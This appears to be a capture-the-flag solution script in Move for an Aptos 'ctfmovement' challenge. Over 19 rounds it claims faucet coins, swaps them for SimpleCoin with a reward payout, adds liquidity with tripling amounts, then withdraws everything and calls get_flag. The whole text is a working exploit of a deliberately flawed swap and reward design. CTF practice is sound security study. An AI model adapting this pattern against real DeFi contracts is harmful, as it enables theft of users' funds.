script {
    use ctfmovement::simple_coin::{Self, SimpleCoin, TestUSDC};
    use ctfmovement::swap::{Self, LPCoin};
    use ctfmovement::swap_utils;    
    use ctfmovement::router;
    use aptos_framework::coin;

    fun catch_the_flag(dev: &signer) {
        // prepare
        let dev_addr = std::signer::address_of(dev);
        router::register_token<SimpleCoin>(dev);

        // initial TestUSDC in amount
        let usdc_in_amount: u64 = 10000000000; // 10^10

        // start swap and add liquidity
        let counter = 0;
        while (counter < 19) {
            simple_coin::claim_faucet(dev, usdc_in_amount);
            let usdc_in = coin::withdraw<TestUSDC>(dev, usdc_in_amount);
            let (simple_out, reward) = swap::swap_exact_y_to_x_direct<SimpleCoin, TestUSDC>(usdc_in);
            let simple_add_amount = coin::value(&simple_out);
            coin::deposit(dev_addr, simple_out);
            coin::deposit(dev_addr, reward);
            let simple_balance = coin::balance<SimpleCoin>(dev_addr);

            let (simp_reserve, usdc_reserve) = swap::pool_reserves<SimpleCoin, TestUSDC>();
            let usdc_add_amount = swap_utils::quote(simple_balance, simp_reserve, usdc_reserve);
            simple_coin::claim_faucet(dev, usdc_add_amount);
            swap::add_liquidity<SimpleCoin, TestUSDC>(dev, simple_add_amount, usdc_add_amount);

            usdc_in_amount = usdc_in_amount * 3;
            counter = counter + 1;
        };

        swap::remove_liquidity<SimpleCoin, TestUSDC>(dev, coin::balance<LPCoin<SimpleCoin, TestUSDC>>(dev_addr));
        simple_coin::get_flag(dev);
    }
}